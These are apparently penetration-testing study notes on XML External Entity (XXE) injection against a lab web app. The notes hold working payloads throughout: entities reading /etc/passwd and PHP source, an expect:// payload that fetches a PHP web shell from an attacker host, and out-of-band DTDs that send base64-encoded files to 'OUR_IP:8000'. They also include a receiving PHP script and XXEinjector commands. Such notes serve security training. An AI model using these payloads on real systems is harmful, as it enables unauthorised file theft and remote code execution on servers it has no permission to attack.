# XML External Entity (XXE) Injection
## Summary
XML External Entity Injection occurs when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.
### XML
```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```
*XML Example*

Key Elements  
|Key|Definition|Example|
|---|----------|-------|
|`Tag`|The keys of an XML document, usually wrapped with (</>) characters.|`<date>`|
|`Entity`|XML variables, usually wrapped with (&/;) characters.|`&lt;`|
|`Element`|The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.|`<date>01-01-2022</date>`|
|`Attribute`|Optional specifications for any element that are stored in the tags, which may be used by the XML parser.|`version="1.0"/encoding="UTF-8"`|
|`Declaration`|Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.|`<?xml version="1.0" encoding="UTF-8"?>`|

### XML DTD
XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined structure can be defined in the document itself or an external file.
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
*Example DTD for the XML above*

The DTD can be placed within the XML document itself, right after the declaration in the first line, or it may be an external file and then referenced in the XML with the `SYSTEM` keyword.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```
*Referencing an external DTD with `SYSTEM`*

The DTD can also be referenced through a URL:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

### XML Entities
We can define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
*Creation of an XML Entity named 'company'*

Once an entity has been created, it can be referenced with an ampersand `&` and a semi-colon `;`, like `&company;`. Whenever an entity  is referenced, it will be replaced with its value by the XML parser. Interestingly, we can reference `External XML Entities` with the `SYSTEM` keyword, followed by the entity's path.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```
*referencing an external entity's company and signature*
> NOTE: We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources. `PUBLIC` is used with publicly declared entities and standards, such as language code.  

This works similar to internal XML entities stored within documents. When refererenced, the parser will replace the entity with its value stored in the external file.

When the XML is parsed on the server-side, in cases like SOAP APIs or web forms, then an entity can reference a file stored on the back-end server, which can then be disclosed to use when we reference the entity.

## Local file Disclosure
### Summary
If a web app trusts unfiltered XML from user input, we can abuse that to reference a DTD document and create a new entity. If we define an entity that references a local file, we can then make the web page show that file.

### Enumeration
- First, we need to find a web page that accepts XML User input
![web_attacks_xxe_identify](/External/images/web_attacks_xxe_identify.jpg)
*Example contact form*

    - If we intercept the request in burp, we can see that it formats our input as XML
![web_attacks_xxe_request](/External/images/web_attacks_xxe_request.jpg)

    - If fill out the form and submit the request, we get the following, telling use the email field may be vulnerable (Because it displays our information back to us).
![web_attacks_xxe_response](/External/images/web_attacks_xxe_response.jpg)

- Take note of which fields are being displayed back to us

- Now to test our potential finding, we can add an entity, and then reference it (in this case, in the email field).
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
*New XML Entity*

![web_attakcs_xxe_new_entity](/External/images/web_attacks_xxe_new_entity.jpg)
*We've added our entity, and referenced it in the email field*

- From the reply, we can see that it referenced our entity, so we have an XXE vulnerability

### Exploitation
Since we know we can define new entities, let's see if we can point those at the file system.

- Pretty much the same as above, but we alter our XML entity to reference a file, similar to the following:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
- Referencing our test site above, we try it and get back the following:
![web_attacks_xxe_external_entity](/External/images/web_attacks_xxe_external_entity.jpg)
*The response showing that we were able to access /etc/passwd*

- Now we have local file disclosure, and we can use that to get the source code of the web app, or other valuable info.

### Reading Source Code
We can't use the above method for source code because some special characters may be included that are not allowed in XML, such as `<`/`>`/`&`.

PHP in particular provides a wrapper that allows us to base64 encode certain resources, and the final base64 should not break the xml output.

- Instead of using `file` in our entity, we will use PHP's `php://filter/wrapper/`, specifying the `convert.base64-encode` encoder as our filter.
```XML
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
*using base64 php filter to exfiltrate source code*
> Note: This only works with PHP  

### Remote Code Execution
- Easiest Methods for RCE would be forcing a call back from a windows server (Responder) or locating ssh keys.
- If PHP `expect` module is installed, we may be able to use the `PHP://expect` filter
    - `expect` must be installed
    - We must get output back on the screen, such as the example above.
    - Limited to relatively simple commands that won't break XML

- One of the easiest methods would be to upload a webshell hosted on our attack host, and have the `expect` method upload it for us.
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
- Now we can use the following XML to upload it to the server
```XML
<?xml version="1.0"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
> Note: We replaced all of the spaces with `$IFS` to avoid breaking the XML.

> Note: The expect module is not enabled/installed by default on modern PHP servers.

## Advanced File Disclosure
### Data Exfiltration with CDATA
- We can use `CDATA` to extract any kind of data (even binnary files) from any web application.
- We do this by wrapping the entity in the `CDATA` tag: `<![CDATA[ FILE_CONTENT ]]>`
- Easier to define a begin and an end, like below
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
> Note: XML prevents joining internal and external entities, so this may not work  

### XML Parameter identities
- We can use parameter identities to get around the above referenced limitation.
- `XML Parameter Identites` are special types of entities that start with a `%` and can only be used within the DTD.
        - What's unique about parameter identites is that if we reference them from an external source, then all of them would be considered external.

- Exploitation
- We need to host the DTD on another server (Like our attack host)
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
- Now we can reference our external entity, and then print the `&joined;` entity we created.
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

### Error Based XXE
We may find ourselves in a situation where the web app doesn't write any output, this would be `blind XXE`. In that case, if the webapp displays runtime errors, and doesn't have proper exception handling for the XML input, then we can use this read the output of our XXE exploit. It's very possible the webapp may do neither of these, in which case we are completely blind.

- Basically, we are looking for the error message to display our XXE instead of it being output to the screen.
- Simple enumeration is to delete a tag in the XML and see if it generates an error.
- We can host the below DTD on our system and reference it from the server.
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
- The above code creates an entity `file` for the file we want to read (`<!ENTITY % file SYSTEM "file:///etc/hosts">`), and then we create a nonsense entity that tries to join with our file entity (`<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`), since the 2nd entity does not exist, it will throw an error, along with our file entity.
- We can then that references our error entity hosted on our attack system.
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

## Blind Data Exfiltration
### Summary
Useful if the webapp doesn't write any of your inputs back to the screen.

### Out-of-band Data Exfiltration
We need to create 2 entities. One for the content of the file we are trying to read, and then one to send the contents of that file back to our attack host. We'll save these to our attack host and spin up an http server.
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
*Example xxe.dtd*

With the above entities, our first entity reads and base64 encodes the content of `/etc/passwd` and stores it in the entity `file`. The second entity, when called, performs a web request with a content parameter that contains the value of file. We can then base64 decode the content parameter to get our results.

If we want, we can generate a php script that will decode it for us. We can use the following code and save it as index.php:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
We start a php server in the same folder as our index.php
```bash
php -S 0.0.0.0:8000
```

We then craft our request, to reference our hosted dtd file. All we have to do is add the xml containing a reference to `oob` and our `remote` entity to pull our malicious dtd.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
*Example payload*

Then we can go back to our php server and see that we did indeed get the file contents we were looking for, in this case `/etc/passwd`
>Tip: Instead of using a parameter to hold our data, we could also edit our DTD to use `%file;` as a subdomain (`%file;.our.website.com`) and use tcpdump to intercept the traffic.

### Automated OOB Exfiltration
- We can use `XXE Injector` to exfiltrate data.

- Installation
```bash
git clone https://github.com/enjoiz/XXEinjector.git
```
- Now we need to copy our request out of burp and save it as a file. We don't need to copy all of the XML, just the first line: `<?xml version="1.0" encoding="UTF-8"?>` and insert `XXEINJECT` right below it, so it should look like this:
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
*Sample HTTP request*

- Now we can run the tool
```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
> Note: The data will probably not be printed to the console, however, we can view the results in the log file in the tools folder.
